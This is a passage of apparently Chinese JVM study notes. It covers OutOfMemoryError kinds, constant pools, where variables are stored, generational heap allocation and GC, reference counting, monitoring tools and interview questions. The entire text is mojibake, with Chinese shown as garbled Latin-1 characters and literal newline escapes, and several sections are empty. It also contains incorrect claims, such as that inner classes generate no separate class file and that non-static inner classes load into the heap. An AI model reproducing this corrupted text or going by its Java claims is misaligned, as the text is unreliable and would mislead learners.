†æº¢å‡º\n  * è®¾ç½®å †å†…å­˜æŒ‡ä»¤ï¼š`-Xmx Size`\n\n* java.lang.OutOfMemoryErrorï¼šGC overhead limit exceeded  \n  * å½“ JVM èŠ±å¤ªå¤šæ—¶é—´æ‰§è¡Œåƒåœ¾å›æ”¶å¹¶ä¸”åªèƒ½å›æ”¶å¾ˆå°‘çš„å †ç©ºé—´æ—¶ï¼Œå°±ä¼šå‘ç”Ÿæ­¤é”™è¯¯ã€‚\n  * å³ç¨‹åºåŸºæœ¬ä¸Šè€—å°½äº†æ‰€æœ‰çš„å¯ç”¨å†…å­˜, GCä¹Ÿæ¸…ç†ä¸äº†ã€‚\n\n* java.lang.OutOfMemoryErrorï¼šDirect buffer memory\n  * ç›´æ¥å†…å­˜æº¢å‡º\n\n* java.lang.OutOfMemoryErrorï¼šunable to create new native thread\n  * ç³»ç»Ÿå†…å­˜è€—å°½ï¼Œæ— æ³•ä¸ºæ–°çº¿ç¨‹åˆ†é…å†…å­˜æˆ–è€…åˆ›å»ºçº¿ç¨‹æ•°è¶…è¿‡äº†æ“ä½œç³»ç»Ÿçš„é™åˆ¶\n* java.lang.OutOfMemoryError: PermGen space\n  * Java 1.8 ä»¥å‰ï¼šæ°¸ä¹…ä»£å†…å­˜æº¢å‡º \n  *  `-XX:MaxPermSize=8m`\t\n\n* java.lang.OutOfMemoryErrorï¼šMetaspace\n  * Java 1.8 ä¹‹åï¼šå…ƒç©ºé—´å†…å­˜æº¢å‡º\n  * `-XX:MaxMetaspaceSize=8m`\t\n\n\nJava ç¼–è¯‘æŒ‡ä»¤ï¼š`javac -g æ–‡ä»¶å.java`\n\nJava åç¼–è¯‘æŒ‡ä»¤ï¼š`javap -v æ–‡ä»¶å.class`\n\nåå°è¿è¡Œï¼š`nohup java å…¨è·¯å¾„å`\n\n### 3ç§å¸¸é‡æ± \n\n**å¸¸é‡æ± **ï¼šä¸»è¦å­˜æ”¾ç¼–è¯‘æœŸç”Ÿæˆçš„å„ç§**å­—é¢é‡(Literal)å’Œç¬¦å·å¼•ç”¨(Symbolic References)**ã€‚\n\n- å­—é¢é‡:ä¾‹å¦‚æ–‡æœ¬å­—ç¬¦ä¸²ã€finaä¿®é¥°çš„å¸¸é‡ã€‚\n- ç¬¦å·å¼•ç”¨:ä¾‹å¦‚ç±»å’Œæ¥å£çš„å…¨é™å®šåã€å­—æ®µçš„åç§°å’Œæè¿°ç¬¦ã€æ–¹æ³•çš„åç§°å’Œæè¿°ç¬¦\n\n**è¿è¡Œæ—¶å¸¸é‡æ± **ï¼šè¿è¡Œæ—¶å¸¸é‡æ± é‡Œé¢å­˜å‚¨çš„ä¸»è¦æ˜¯**ç¼–è¯‘æœŸé—´ç”Ÿæˆçš„å­—é¢é‡ã€ç¬¦å·å¼•ç”¨**ç­‰ç­‰ã€‚\n\n- å½“ç±»åŠ è½½åˆ°å†…å­˜ä¸­åï¼ŒJVMå°±ä¼šå°†**å¸¸é‡æ± **ä¸­çš„å†…å®¹å­˜æ”¾åˆ°è¿è¡Œæ—¶å¸¸é‡æ± ä¸­ï¼›\n- ç±»åŠ è½½åœ¨é“¾æ¥ç¯èŠ‚çš„è§£æè¿‡ç¨‹ï¼Œä¼šç¬¦å·å¼•ç”¨è½¬æ¢æˆç›´æ¥å¼•ç”¨ï¼ˆé™æ€é“¾æ¥ï¼‰ã€‚æ­¤å¤„å¾—åˆ°çš„**ç›´æ¥å¼•ç”¨**ä¹Ÿæ˜¯æ”¾åˆ°è¿è¡Œæ—¶å¸¸é‡æ± ä¸­çš„ã€‚\n- è¿è¡ŒæœŸé—´å¯ä»¥åŠ¨æ€æ”¾å…¥æ–°çš„å¸¸é‡ã€‚\n\n**å­—ç¬¦ä¸²å¸¸é‡æ± **ï¼šå¯ä»¥ç†è§£æˆè¿è¡Œæ—¶å¸¸é‡æ± åˆ†å‡ºæ¥çš„ä¸€éƒ¨åˆ†ã€‚ç±»åŠ è½½åˆ°å†…å­˜çš„æ—¶å€™ï¼Œå­—ç¬¦ä¸²ä¼šå­˜åˆ°å­—ç¬¦ä¸²å¸¸é‡æ± é‡Œé¢ã€‚ \n\n- JVM ä¸ºäº†æå‡æ€§èƒ½å’Œå‡å°‘å†…å­˜æ¶ˆè€—é’ˆå¯¹å­—ç¬¦ä¸²ï¼ˆString ç±»ï¼‰ä¸“é—¨å¼€è¾Ÿçš„ä¸€å—åŒºåŸŸï¼Œä¸»è¦ç›®çš„æ˜¯ä¸ºäº†é¿å…å­—ç¬¦ä¸²çš„é‡å¤åˆ›å»ºã€‚\n- JDK6æ—¶å­—ç¬¦ä¸²å¸¸é‡æ± ä½äºè¿è¡Œæ—¶å¸¸é‡æ± ï¼ŒJDK7æŒªåˆ°å †ä¸­ã€‚\n\n**3è€…åŒºåˆ«ï¼Ÿ**\n\n* å¸¸é‡æ± ä¸è¿è¡Œæ—¶å¸¸é‡æ± éƒ½å­˜å‚¨åœ¨**æ–¹æ³•åŒº**ï¼Œè€Œå­—ç¬¦ä¸²å¸¸é‡æ± åœ¨ Jdk7 æ—¶å°±å·²ç»ä»æ–¹æ³•åŒºè¿ç§»åˆ°äº† Java å †ä¸­\n\nåœ¨ç±»ç¼–è¯‘è¿‡ç¨‹ä¸­ï¼Œä¼šæŠŠç±»å…ƒä¿¡æ¯æ”¾åˆ°æ–¹æ³•åŒºï¼Œç±»å…ƒä¿¡æ¯çš„å…¶ä¸­ä¸€éƒ¨åˆ†ä¾¿æ˜¯å¸¸é‡æ± ï¼Œä¸»è¦å­˜æ”¾å­—é¢é‡å’Œç¬¦å·å¼•ç”¨ï¼Œè€Œå­—é¢é‡çš„ä¸€éƒ¨åˆ†ä¾¿æ˜¯æ–‡æœ¬å­—ç¬¦ï¼›**åœ¨ç±»åŠ è½½æ—¶å°†å­—é¢é‡å’Œç¬¦å·å¼•ç”¨è§£æä¸ºç›´æ¥å¼•ç”¨å­˜å‚¨åœ¨è¿è¡Œæ—¶å¸¸é‡æ± **ï¼›å¯¹äºæ–‡æœ¬å­—ç¬¦ï¼Œä¼šåœ¨è§£ææ—¶æŸ¥æ‰¾å­—ç¬¦ä¸²å¸¸é‡æ± ï¼ŒæŸ¥å‡ºè¿™ä¸ªæ–‡æœ¬å­—ç¬¦å¯¹åº”çš„å­—ç¬¦ä¸²å¯¹è±¡çš„ç›´æ¥å¼•ç”¨ï¼Œå°†ç›´æ¥å¼•ç”¨å­˜å‚¨åœ¨è¿è¡Œæ—¶å¸¸é‡æ± \n\n### å˜é‡ä½ç½®\n\nå˜é‡çš„ä½ç½®ä¸å–å†³äºå®ƒæ˜¯åŸºæœ¬æ•°æ®ç±»å‹è¿˜æ˜¯å¼•ç”¨æ•°æ®ç±»å‹ï¼Œå–å†³äºå®ƒçš„**å£°æ˜ä½ç½®**\n\né™æ€å†…éƒ¨ç±»å’Œå…¶ä»–å†…éƒ¨ç±»ï¼šæ–¹æ³•åŒº/å †\n\n* **ä¸€ä¸ª class æ–‡ä»¶åªèƒ½å¯¹åº”ä¸€ä¸ª public ç±»å‹çš„ç±»**ï¼Œè¿™ä¸ªç±»å¯ä»¥æœ‰å†…éƒ¨ç±»ï¼Œä½†ä¸ä¼šç”Ÿæˆæ–°çš„ class æ–‡ä»¶\n\n* é™æ€å†…éƒ¨ç±»å±äºç±»æœ¬èº«ï¼ŒåŠ è½½åˆ°**æ–¹æ³•åŒº**ï¼Œå…¶ä»–å†…éƒ¨ç±»å±äºå†…éƒ¨ç±»çš„å±æ€§ï¼ŒåŠ è½½åˆ°**å †**\n\nç±»å˜é‡ï¼šå †\n\n* ç±»å˜é‡æ˜¯ç”¨ static ä¿®é¥°ç¬¦ä¿®é¥°ï¼Œå®šä¹‰åœ¨æ–¹æ³•å¤–çš„å˜é‡ï¼Œéšç€ Java è¿›ç¨‹äº§ç”Ÿå’Œé”€æ¯\n* åœ¨ Java8 ä¹‹å‰æŠŠé™æ€å˜é‡å­˜æ”¾äºæ–¹æ³•åŒºï¼Œåœ¨ Java8 æ—¶å­˜æ”¾åœ¨**å †ä¸­çš„é™æ€å˜é‡åŒº**\n\n\nå®ä¾‹å˜é‡ï¼šå †\n\n* å®ä¾‹ï¼ˆæˆå‘˜ï¼‰å˜é‡æ˜¯å®šä¹‰åœ¨ç±»ä¸­ï¼Œæ²¡æœ‰ static ä¿®é¥°çš„å˜é‡ï¼Œéšç€ç±»çš„å®ä¾‹äº§ç”Ÿå’Œé”€æ¯ï¼Œæ˜¯ç±»å®ä¾‹çš„ä¸€éƒ¨åˆ†\n* åœ¨ç±»åˆå§‹åŒ–çš„æ—¶å€™ï¼Œä»è¿è¡Œæ—¶å¸¸é‡æ± å–å‡ºç›´æ¥å¼•ç”¨æˆ–è€…å€¼ï¼Œ**ä¸åˆå§‹åŒ–çš„å¯¹è±¡ä¸€èµ·æ”¾å…¥å †ä¸­**\n\nå±€éƒ¨å˜é‡ï¼šè™šæ‹Ÿæœºæ ˆ\n\n* å±€éƒ¨å˜é‡æ˜¯å®šä¹‰åœ¨ç±»çš„æ–¹æ³•ä¸­çš„å˜é‡\n* åœ¨æ‰€åœ¨æ–¹æ³•è¢«è°ƒç”¨æ—¶**æ”¾å…¥è™šæ‹Ÿæœºæ ˆçš„æ ˆå¸§**ä¸­ï¼Œæ–¹æ³•æ‰§è¡Œç»“æŸåä»è™šæ‹Ÿæœºæ ˆä¸­å¼¹å‡º\n\n\n\n\n\n# â‘¢å†…å­˜ç®¡ç†\n\n## â¶å†…å­˜åˆ†é…\n\n### åˆ†ä»£æ€æƒ³\n\n#### åˆ†ä»£ä»‹ç»\n\nJava8 æ—¶ï¼Œå †è¢«åˆ†ä¸ºäº†ä¸¤ä»½ï¼šæ–°ç”Ÿä»£å’Œè€å¹´ä»£ï¼ˆ1:2ï¼‰ï¼Œåœ¨ Java7 æ—¶ï¼Œè¿˜å­˜åœ¨ä¸€ä¸ªæ°¸ä¹…ä»£\n\n- æ–°ç”Ÿä»£ä½¿ç”¨ï¼šå¤åˆ¶ç®—æ³•\n- è€å¹´ä»£ä½¿ç”¨ï¼šæ ‡è®° - æ¸…é™¤ æˆ–è€… æ ‡è®° - æ•´ç† ç®—æ³•\n\nYoung åŒºè¢«åˆ’åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼ŒEden åŒºå’Œä¸¤ä¸ªå¤§å°ä¸¥æ ¼ç›¸åŒçš„ Survivor åŒºã€‚ Eden å’Œ Survivor å¤§å°æ¯”ä¾‹é»˜è®¤ä¸º 8:1:1\n\n- Survivor åŒºæŸä¸€æ—¶åˆ»åªæœ‰å…¶ä¸­ä¸€ä¸ªæ˜¯è¢«ä½¿ç”¨çš„ï¼Œå¦å¤–ä¸€ä¸ªç•™åšåƒåœ¾å›æ”¶æ—¶å¤åˆ¶å¯¹è±¡ã€‚\n- åœ¨ Eden åŒºå˜æ»¡çš„æ—¶å€™ï¼ŒGC å°±ä¼šå°†å­˜æ´»çš„å¯¹è±¡ç§»åˆ°ç©ºé—²çš„ Survivor åŒºé—´ä¸­ï¼Œæ ¹æ® JVM çš„ç­–ç•¥ï¼Œåœ¨ç»è¿‡å‡ æ¬¡åƒåœ¾å›æ”¶åï¼Œä»ç„¶å­˜æ´»äº Survivor çš„å¯¹è±¡å°†è¢«ç§»åŠ¨åˆ° Old åŒºé—´\n\nOld åŒºä¸»è¦ä¿å­˜ç”Ÿå‘½å‘¨æœŸé•¿çš„å¯¹è±¡ï¼Œä¸€èˆ¬æ˜¯ä¸€äº›è€çš„å¯¹è±¡ï¼Œå½“ä¸€äº›å¯¹è±¡åœ¨ Young å¤åˆ¶è½¬ç§»ä¸€å®šçš„æ¬¡æ•°ä»¥åï¼Œå¯¹è±¡å°±ä¼šè¢«è½¬ç§»åˆ° Old åŒº\n\n<img src=\"https://img.jwt1399.top/img/202212071718619.png\"  />\n\nåˆ†ä»£åŸå› ï¼šä¸åŒå¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸä¸åŒï¼Œ70%-99% çš„å¯¹è±¡éƒ½æ˜¯ä¸´æ—¶å¯¹è±¡ï¼Œä¼˜åŒ– GC æ€§èƒ½\n\n**Minor GC å’Œ Full GC**ï¼š\n\n- Minor GCï¼šå›æ”¶æ–°ç”Ÿä»£ï¼Œæ–°ç”Ÿä»£å¯¹è±¡å­˜æ´»æ—¶é—´å¾ˆçŸ­ï¼Œæ‰€ä»¥ Minor GC ä¼šé¢‘ç¹æ‰§è¡Œï¼Œæ‰§è¡Œçš„é€Ÿåº¦æ¯”è¾ƒå¿«\n- Full GCï¼šå›æ”¶è€å¹´ä»£å’Œæ–°ç”Ÿä»£ï¼Œè€å¹´ä»£å¯¹è±¡å…¶å­˜æ´»æ—¶é—´é•¿ï¼Œæ‰€ä»¥ Full GC å¾ˆå°‘æ‰§è¡Œï¼Œæ‰§è¡Œé€Ÿåº¦ä¼šæ¯” Minor GC æ…¢å¾ˆå¤š\n\n***\n\n#### åˆ†ä»£åˆ†é…\n\nå·¥ä½œæœºåˆ¶ï¼š\n\n* **å¯¹è±¡ä¼˜å…ˆåœ¨ Eden åˆ†é…**ï¼šå½“åˆ›å»ºä¸€ä¸ªå¯¹è±¡çš„æ—¶å€™ï¼Œå¯¹è±¡ä¼šè¢«åˆ†é…åœ¨æ–°ç”Ÿä»£çš„ Eden åŒºï¼Œå½“ Eden åŒºè¦æ»¡äº†æ—¶å€™ï¼Œè§¦å‘ YoungGC\n* å½“è¿›è¡Œ YoungGC åï¼Œæ­¤æ—¶åœ¨ Eden åŒºå­˜æ´»çš„å¯¹è±¡è¢«ç§»åŠ¨åˆ° to åŒºï¼Œå¹¶ä¸”å½“å‰å¯¹è±¡çš„å¹´é¾„ä¼šåŠ  1ï¼Œæ¸…ç©º Eden åŒº\n* å½“å†ä¸€æ¬¡è§¦å‘ YoungGC çš„æ—¶å€™ï¼Œä¼šæŠŠ Eden åŒºä¸­å­˜æ´»ä¸‹æ¥çš„å¯¹è±¡å’Œ to ä¸­çš„å¯¹è±¡ï¼Œç§»åŠ¨åˆ° from åŒºä¸­ï¼Œè¿™äº›å¯¹è±¡çš„å¹´é¾„ä¼šåŠ  1ï¼Œæ¸…ç©º Eden åŒºå’Œ to åŒº\n* To åŒºæ°¸è¿œæ˜¯ç©º Survivor åŒºï¼ŒFrom åŒºæ˜¯æœ‰æ•°æ®çš„ï¼Œæ¯æ¬¡ MinorGC åä¸¤ä¸ªåŒºåŸŸäº’æ¢\n* From åŒºå’Œ To åŒº ä¹Ÿå¯ä»¥å«åš S0 åŒºå’Œ S1 åŒº\n\næ™‹å‡åˆ°è€å¹´ä»£ï¼š\n\n* **é•¿æœŸå­˜æ´»çš„å¯¹è±¡è¿›å…¥è€å¹´ä»£**ï¼šä¸ºå¯¹è±¡å®šä¹‰å¹´é¾„è®¡æ•°å™¨ï¼Œå¯¹è±¡åœ¨ Eden å‡ºç”Ÿå¹¶ç»è¿‡ Minor GC ä¾ç„¶å­˜æ´»ï¼Œå°†ç§»åŠ¨åˆ° Survivor ä¸­ï¼Œå¹´é¾„å°±å¢åŠ  1 å²ï¼Œå¢åŠ åˆ°ä¸€å®šå¹´é¾„åˆ™ç§»åŠ¨åˆ°è€å¹´ä»£ä¸­\n\n  `-XX:MaxTenuringThreshold`ï¼šå®šä¹‰å¹´é¾„çš„é˜ˆå€¼ï¼Œå¯¹è±¡å¤´ä¸­ç”¨ 4 ä¸ª bit å­˜å‚¨ï¼Œæ‰€ä»¥æœ€å¤§å€¼æ˜¯ 15ï¼Œé»˜è®¤ä¹Ÿæ˜¯ 15\n\n* **å¤§å¯¹è±¡ç›´æ¥è¿›å…¥è€å¹´ä»£**ï¼šéœ€è¦è¿ç»­å†…å­˜ç©ºé—´çš„å¯¹è±¡ï¼Œæœ€å…¸å‹çš„å¤§å¯¹è±¡æ˜¯å¾ˆé•¿çš„å­—ç¬¦ä¸²ä»¥åŠæ•°ç»„ï¼›é¿å…åœ¨ Eden å’Œ Survivor ä¹‹é—´çš„å¤§é‡å¤åˆ¶ï¼›ç»å¸¸å‡ºç°å¤§å¯¹è±¡ä¼šæå‰è§¦å‘ GC ä»¥è·å–è¶³å¤Ÿçš„è¿ç»­ç©ºé—´åˆ†é…ç»™å¤§å¯¹è±¡\n\n  `-XX:PretenureSizeThreshold`ï¼šå¤§äºæ­¤å€¼çš„å¯¹è±¡ç›´æ¥åœ¨è€å¹´ä»£åˆ†é…\n\n* **åŠ¨æ€å¯¹è±¡å¹´é¾„åˆ¤å®š**ï¼šå¦‚æœåœ¨ Survivor åŒºä¸­ç›¸åŒå¹´é¾„çš„å¯¹è±¡çš„æ‰€æœ‰å¤§å°ä¹‹å’Œè¶…è¿‡ Survivor ç©ºé—´çš„ä¸€åŠï¼Œå¹´é¾„å¤§äºç­‰äºè¯¥å¹´é¾„çš„å¯¹è±¡å°±å¯ä»¥ç›´æ¥è¿›å…¥è€å¹´ä»£\n\nç©ºé—´åˆ†é…æ‹…ä¿ï¼š\n\n* åœ¨å‘ç”Ÿ Minor GC ä¹‹å‰ï¼Œè™šæ‹Ÿæœºå…ˆæ£€æŸ¥è€å¹´ä»£æœ€å¤§å¯ç”¨çš„è¿ç»­ç©ºé—´æ˜¯å¦å¤§äºæ–°ç”Ÿä»£æ‰€æœ‰å¯¹è±¡æ€»ç©ºé—´ï¼Œå¦‚æœæ¡ä»¶æˆç«‹çš„è¯ï¼Œé‚£ä¹ˆ Minor GC å¯ä»¥ç¡®è®¤æ˜¯å®‰å…¨çš„\n* å¦‚æœä¸æˆç«‹ï¼Œè™šæ‹Ÿæœºä¼šæŸ¥çœ‹ HandlePromotionFailure çš„å€¼æ˜¯å¦å…è®¸æ‹…ä¿å¤±è´¥ï¼Œå¦‚æœå…è®¸é‚£ä¹ˆå°±ä¼šç»§ç»­æ£€æŸ¥è€å¹´ä»£æœ€å¤§å¯ç”¨çš„è¿ç»­ç©ºé—´æ˜¯å¦å¤§äºå†æ¬¡æ™‹å‡åˆ°è€å¹´ä»£å¯¹è±¡çš„å¹³å‡å¤§å°ï¼Œå¦‚æœå¤§äºå°†å°è¯•ç€è¿›è¡Œä¸€æ¬¡ Minor GCï¼›å¦‚æœå°äºæˆ–è€… HandlePromotionFailure çš„å€¼ä¸å…è®¸å†’é™©ï¼Œé‚£ä¹ˆå°±è¦è¿›è¡Œä¸€æ¬¡ Full GC\n\n## â·å›æ”¶ç­–ç•¥\n\n\n\n\n\n## â¸åƒåœ¾åˆ¤æ–­\n\n### åƒåœ¾ä»‹ç»\n\nåƒåœ¾ï¼š**å¦‚æœä¸€ä¸ªæˆ–å¤šä¸ªå¯¹è±¡æ²¡æœ‰ä»»ä½•çš„å¼•ç”¨æŒ‡å‘å®ƒäº†ï¼Œé‚£ä¹ˆè¿™ä¸ªå¯¹è±¡ç°åœ¨å°±æ˜¯åƒåœ¾**\n\nä½œç”¨ï¼šé‡Šæ”¾æ²¡ç”¨çš„å¯¹è±¡ï¼Œæ¸…é™¤å†…å­˜é‡Œçš„è®°å½•ç¢ç‰‡ï¼Œç¢ç‰‡æ•´ç†å°†æ‰€å ç”¨çš„å †å†…å­˜ç§»åˆ°å †çš„ä¸€ç«¯ï¼Œä»¥ä¾¿ JVM å°†æ•´ç†å‡ºçš„å†…å­˜åˆ†é…ç»™æ–°çš„å¯¹è±¡\n\nåŒºåŸŸï¼šåƒåœ¾æ”¶é›†ä¸»è¦æ˜¯é’ˆå¯¹**å †**å’Œ**æ–¹æ³•åŒº**è¿›è¡Œï¼Œç¨‹åºè®¡æ•°å™¨ã€è™šæ‹Ÿæœºæ ˆå’Œæœ¬åœ°æ–¹æ³•æ ˆè¿™ä¸‰ä¸ªåŒºåŸŸå±äºçº¿ç¨‹ç§æœ‰çš„ï¼Œåªå­˜åœ¨äºçº¿ç¨‹çš„ç”Ÿå‘½å‘¨æœŸå†…ï¼Œçº¿ç¨‹ç»“æŸä¹‹åå°±ä¼šæ¶ˆå¤±ï¼Œå› æ­¤ä¸éœ€è¦å¯¹è¿™ä¸‰ä¸ªåŒºåŸŸè¿›è¡Œåƒåœ¾å›æ”¶\n\nåœ¨å †é‡Œå­˜æ”¾ç€å‡ ä¹æ‰€æœ‰çš„ Java å¯¹è±¡å®ä¾‹ï¼Œåœ¨ GC æ‰§è¡Œåƒåœ¾å›æ”¶ä¹‹å‰ï¼Œé¦–å…ˆéœ€è¦åŒºåˆ†å‡ºå†…å­˜ä¸­å“ªäº›æ˜¯å­˜æ´»å¯¹è±¡ï¼Œå“ªäº›æ˜¯å·²ç»æ­»äº¡çš„å¯¹è±¡ã€‚åªæœ‰è¢«æ ‡è®°ä¸ºå·±ç»æ­»äº¡çš„å¯¹è±¡ï¼ŒGC æ‰ä¼šåœ¨æ‰§è¡Œåƒåœ¾å›æ”¶æ—¶ï¼Œé‡Šæ”¾æ‰å…¶æ‰€å ç”¨çš„å†…å­˜ç©ºé—´ï¼Œå› æ­¤è¿™ä¸ªè¿‡ç¨‹å¯ä»¥ç§°ä¸ºåƒåœ¾æ ‡è®°é˜¶æ®µï¼Œåˆ¤æ–­å¯¹è±¡å­˜æ´»ä¸€èˆ¬æœ‰ä¸¤ç§æ–¹å¼ï¼š**å¼•ç”¨è®¡æ•°ç®—æ³•**å’Œ**å¯è¾¾æ€§åˆ†æç®—æ³•**\n\n### å¼•ç”¨è®¡æ•°æ³•\n\nå¼•ç”¨è®¡æ•°ç®—æ³•ï¼ˆReference Countingï¼‰ï¼šå¯¹æ¯ä¸ªå¯¹è±¡ä¿å­˜ä¸€ä¸ªæ•´å‹çš„å¼•ç”¨è®¡æ•°å™¨å±æ€§ï¼Œç”¨äºè®°å½•å¯¹è±¡è¢«å¼•ç”¨çš„æƒ…å†µã€‚å¯¹äºä¸€ä¸ªå¯¹è±¡ Aï¼Œåªè¦æœ‰ä»»ä½•ä¸€ä¸ªå¯¹è±¡å¼•ç”¨äº† Aï¼Œåˆ™ A çš„å¼•ç”¨è®¡æ•°å™¨å°±åŠ  1ï¼›å½“å¼•ç”¨å¤±æ•ˆæ—¶ï¼Œå¼•ç”¨è®¡æ•°å™¨å°±å‡ 1ï¼›å½“å¯¹è±¡ A çš„å¼•ç”¨è®¡æ•°å™¨çš„å€¼ä¸º 0ï¼Œå³è¡¨ç¤ºå¯¹è±¡Aä¸å¯èƒ½å†è¢«ä½¿ç”¨ï¼Œå¯è¿›è¡Œå›æ”¶ï¼ˆJava æ²¡æœ‰é‡‡ç”¨ï¼‰\n\nä¼˜ç‚¹ï¼š\n\n- å›æ”¶æ²¡æœ‰å»¶è¿Ÿæ€§ï¼Œæ— éœ€ç­‰åˆ°å†…å­˜ä¸å¤Ÿçš„æ—¶å€™æ‰å¼€å§‹å›æ”¶ï¼Œè¿è¡Œæ—¶æ ¹æ®å¯¹è±¡è®¡æ•°å™¨æ˜¯å¦ä¸º 0ï¼Œå¯ä»¥ç›´æ¥å›æ”¶\n- åœ¨åƒåœ¾å›æ”¶è¿‡ç¨‹ä¸­ï¼Œåº”ç”¨æ— éœ€æŒ‚èµ·ï¼›å¦‚æœç”³è¯·å†…å­˜æ—¶ï¼Œå†…å­˜ä¸è¶³ï¼Œåˆ™ç«‹åˆ»æŠ¥ OOM é”™è¯¯\n- åŒºåŸŸæ€§ï¼Œæ›´æ–°å¯¹è±¡çš„è®¡æ•°å™¨æ—¶ï¼Œåªæ˜¯å½±å“åˆ°è¯¥å¯¹è±¡ï¼Œä¸ä¼šæ‰«æå…¨éƒ¨å¯¹è±¡\n\nç¼ºç‚¹ï¼š\n\n- æ¯æ¬¡å¯¹è±¡è¢«å¼•ç”¨æ—¶ï¼Œéƒ½éœ€è¦å»æ›´æ–°è®¡æ•°å™¨ï¼Œæœ‰ä¸€ç‚¹æ—¶é—´å¼€é”€\n\n- æµªè´¹ CPU èµ„æºï¼Œå³ä½¿å†…å­˜å¤Ÿç”¨ï¼Œä»ç„¶åœ¨è¿è¡Œæ—¶è¿›è¡Œè®¡æ•°å™¨çš„ç»Ÿè®¡ã€‚\n\n- **æ— æ³•è§£å†³å¾ªç¯å¼•ç”¨é—®é¢˜ï¼Œä¼šå¼•å‘å†…å­˜æ³„éœ²**ï¼ˆæœ€å¤§çš„ç¼ºç‚¹ï¼‰\n\n### å¯è¾¾æ€§åˆ†æ\n\n\n\n\n\n\n\n# â‘£ç±»åŠ è½½\n\n# â‘¤è¿è¡Œæœºåˆ¶\n\n# â‘¥ç³»ç»Ÿä¼˜åŒ–\n\n# è°ƒè¯•å‚æ•°\n\n`-XX:MaxTenuringThreshold`ï¼šå®šä¹‰å¹´é¾„çš„é˜ˆå€¼ï¼Œå¯¹è±¡å¤´ä¸­ç”¨ 4 ä¸ª bit å­˜å‚¨ï¼Œæ‰€ä»¥æœ€å¤§å€¼æ˜¯ 15ï¼Œé»˜è®¤ä¹Ÿæ˜¯ 15\n\n`-XX:PretenureSizeThreshold`ï¼šå¤§äºæ­¤å€¼çš„å¯¹è±¡ç›´æ¥åœ¨è€å¹´ä»£åˆ†é…\n\n\n\n# JVMç›‘æ§åŠè¯Šæ–­å·¥å…·\n\n- jps ï¼šå®šä½è¿›ç¨‹ ID\n- jstack è¿›ç¨‹ IDï¼šç”¨äºæ‰“å°å‡ºç»™å®šçš„ Java è¿›ç¨‹ ID æˆ– core file æˆ–è¿œç¨‹è°ƒè¯•æœåŠ¡çš„ Java å †æ ˆä¿¡æ¯\n- jmapï¼šæŸ¥çœ‹æŸä¸€æ—¶åˆ»å †å†…å­˜å ç”¨æƒ…å†µ  `jhsdb jmap --heap --pid è¿›ç¨‹id`\n- jconsoleï¼šå›¾å½¢ç•Œé¢çš„ï¼Œå¤šåŠŸèƒ½çš„ç›‘æµ‹å·¥å…·ï¼Œå¯ä»¥è¿ç»­ç›‘æµ‹\n\n- jvisualvm\n\n\n\n# â­ï¸é¢è¯•é¢˜\n\n\n\n### JVM å†…å­˜ç»“æ„\n\nJVMå†…å­˜ç»“æ„åˆ†ä¸º5å¤§åŒºåŸŸï¼Œ**ç¨‹åºè®¡æ•°å™¨**ã€**è™šæ‹Ÿæœºæ ˆ**ã€**æœ¬åœ°æ–¹æ³•æ ˆ**ã€**å †**ã€**æ–¹æ³•åŒº**\n\n**çº¿ç¨‹ç§æœ‰çš„ï¼š**ç¨‹åºè®¡æ•°å™¨ã€è™šæ‹Ÿæœºæ ˆã€æœ¬åœ°æ–¹æ³•æ ˆ\n\n**çº¿ç¨‹å…±äº«çš„ï¼š**å †ã€æ–¹æ³•åŒº\n\n![](https://img.jwt1399.top/img/202212051821230.png)\n\n\n\n### Java å¯¹è±¡çš„åˆ›å»ºè¿‡ç¨‹\n\nStep1:ç±»åŠ è½½æ£€æŸ¥\n\nå½“è™šæ‹Ÿæœºé‡åˆ°ä¸€æ¡ `new` æŒ‡ä»¤æ—¶ï¼Œé¦–å…ˆæ£€æŸ¥æ˜¯å¦èƒ½åœ¨å¸¸é‡æ± ä¸­å®šä½åˆ°è¿™ä¸ªç±»çš„ç¬¦å·å¼•ç”¨ï¼Œå¹¶ä¸”æ£€æŸ¥è¿™ä¸ªç¬¦å·å¼•ç”¨ä»£è¡¨çš„ç±»æ˜¯å¦å·²è¢«åŠ è½½è¿‡ã€è§£æå’Œåˆå§‹åŒ–è¿‡ã€‚å¦‚æœæ²¡æœ‰ï¼Œé‚£å…ˆæ‰§è¡Œç±»åŠ è½½ã€‚\n\nStep2:åˆ†é…å†…å­˜\n\nåœ¨ç±»åŠ è½½æ£€æŸ¥é€šè¿‡åï¼Œæ¥ä¸‹æ¥è™šæ‹Ÿæœºå°†ä¸ºå¯¹è±¡å®ä¾‹åˆ†é…å†…å­˜ã€‚\n\nStep3:åˆå§‹åŒ–é›¶å€¼\n\nåˆ†é…åˆ°çš„å†…å­˜ç©ºé—´éƒ½åˆå§‹åŒ–ä¸ºé›¶å€¼ï¼Œé€šè¿‡è¿™ä¸ªæ“ä½œä¿è¯äº†å¯¹è±¡çš„å­—æ®µå¯ä»¥ä¸èµ‹åˆå§‹å€¼å°±ç›´æ¥ä½¿ç”¨ï¼Œç¨‹åºèƒ½è®¿é—®åˆ°è¿™äº›å­—æ®µçš„æ•°æ®ç±»å‹æ‰€å¯¹åº”çš„é›¶å€¼ã€‚\n\nStep4:è®¾ç½®å¯¹è±¡å¤´\n\nåˆå§‹åŒ–é›¶å€¼å®Œæˆä¹‹åï¼Œ**è™šæ‹Ÿæœºè¦å¯¹å¯¹è±¡è¿›è¡Œå¿…è¦çš„è®¾ç½®**ï¼Œä¾‹å¦‚è¿™ä¸ªå¯¹è±¡æ˜¯å“ªä¸ªç±»çš„å®ä¾‹ã€å¦‚ä½•æ‰èƒ½æ‰¾åˆ°ç±»çš„å…ƒæ•°æ®ä¿¡æ¯ã€å¯¹è±¡çš„å“ˆå¸Œç ã€å¯¹è±¡çš„ GC åˆ†ä»£å¹´é¾„ç­‰ä¿¡æ¯ã€‚ **è¿™äº›ä¿¡æ¯å­˜æ”¾åœ¨å¯¹è±¡å¤´ä¸­ã€‚** å¦å¤–ï¼Œæ ¹æ®è™šæ‹Ÿæœºå½“å‰è¿è¡ŒçŠ¶æ€çš„ä¸åŒï¼Œå¦‚æ˜¯å¦å¯ç”¨åå‘é”ç­‰ï¼Œå¯¹è±¡å¤´ä¼šæœ‰ä¸åŒçš„è®¾ç½®æ–¹å¼ã€‚\n\nStep5:æ‰§è¡Œ init æ–¹æ³•\n\nåœ¨ä¸Šé¢å·¥ä½œéƒ½å®Œæˆä¹‹åï¼Œä»è™šæ‹Ÿæœºçš„è§†è§’æ¥çœ‹ï¼Œä¸€ä¸ªæ–°çš„å¯¹è±¡å·²ç»äº§ç”Ÿäº†ï¼Œä½†ä» Java 